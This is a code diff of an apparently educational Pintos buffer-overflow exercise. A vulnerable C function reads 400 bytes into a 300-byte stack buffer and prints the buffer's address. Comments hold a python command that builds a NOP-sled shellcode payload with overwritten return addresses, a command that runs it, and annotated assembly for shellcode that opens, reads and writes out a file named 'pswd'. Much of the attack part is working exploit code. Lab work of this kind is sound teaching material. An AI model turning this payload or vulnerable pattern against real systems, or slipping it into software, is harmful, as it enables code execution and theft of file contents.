@@ -174,22 +174,16 @@ char shellcode[] =
 "\xff\xbf";
 
 void getMessage( int file ) {
-  // printf( "\n" );
   char buffer[300];
-  // printf( "%p\n", buffer );
-  // printf( "func: before: buffer address: %p\n", buffer );
+  printf( "%p\n", buffer );
   read( file, buffer, 400 );
-  // printf( "func: after\n" );
-  // printf( "%s\n", buffer );
 }
 
 int main( int argc, char *argv[] ) {
-
   int fd = open( argv[1] );
-  // printf( "main: before\n" );
   getMessage( fd );
-  // printf( "main: after\n" );
 
+  printf( "failed" );
   close( fd );
   return 69;
 }
@@ -200,14 +194,14 @@ int main( int argc, char *argv[] ) {
 // python - c "print('\x90'*44+'\x6A\x00\x68\x70\x73\x77\x64\x54\x6A\x06\xCD\x30\x89\xC2\x52\x6A\x07\xCD\x30\x89\xC1\x29\xCC\x89\xE3\x51\x53\x52\x6A\x08\xCD\x30\x89\xC1\x51\x53\x6A\x01\x6A\x09\xCD\x30\x52\x6A\x0C\xCD\x30\x68\x9A\x02\x00\x00\x6A\x01\xCD\x30'+'\x90'*40+'\x56\xfe\xff\xbf'*60)" > .. / userprog / build / shellcode
 // pintos -p ./pswd -a pswd -p ./shellcode -a sh -p ../../examples/shellcode -a shellcode -- -f -q run 'shellcode sh'
 
-// push   0x0               ; push null character
+// push   0x0               ; push null character to indicate end of file name
 // push   0x64777370        ; push file name in hex format
 
 // ; open( file_name )
 // push   esp               ; push the address of the file name as arg1
 // push   0x6               ; push syscall number for open
 // int    0x30              ; interruprt for syscall
-// mov    edx,eax           ; copy fd to edx register
+// mov    edx, eax          ; copy fd to edx register
 
 // ; filesize( fd )
 // push   edx               ; push fd as arg1
@@ -219,7 +213,7 @@ int main( int argc, char *argv[] ) {
 // sub    esp, ecx          ; move esp down the stack by the size of the file to create a buffer to read the data into
 // mov    ebx, esp          ; copy the address of the buffer to ebx register
 // push   ecx               ; push the number of bytes to read as arg3
-// push   ebx               ; push the buffer as arg2
+// push   ebx               ; push the address of the buffer as arg2
 // push   edx               ; push fd as arg1
 // push   0x8               ; push syscall number for read
 // int    0x30              ; interruprt for syscall
